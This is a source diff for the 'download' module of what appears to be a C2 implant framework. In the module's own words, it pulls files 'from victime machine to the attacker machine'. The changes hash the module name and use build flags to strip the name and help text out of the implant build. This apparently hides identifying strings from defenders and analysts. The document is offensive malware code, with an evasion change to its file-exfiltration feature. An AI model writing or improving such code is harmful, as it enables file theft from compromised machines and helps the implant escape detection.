@@ -2,10 +2,14 @@
 
 #include <cstring>
 
+#include "Common.hpp"
+
+
 using namespace std;
 
 
-const std::string moduleName = "download";
+constexpr std::string_view moduleName = "download";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -18,7 +22,11 @@ __declspec(dllexport) Download* DownloadConstructor()
 #endif
 
 Download::Download()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -29,11 +37,12 @@ Download::~Download()
 std::string Download::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "download:\n";
 	info += "Download a file from victime machine to the attacker machine\n";
 	info += "exemple:\n";
 	info += "- download c:\\temp\\toto.exe c:\\temp\\toto.exe\n";
-
+#endif
 	return info;
 }
 
@@ -60,7 +69,7 @@ int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd("");
 	c2RetMessage.set_inputfile(c2Message.inputfile());
 	c2RetMessage.set_outputfile(c2Message.outputfile());
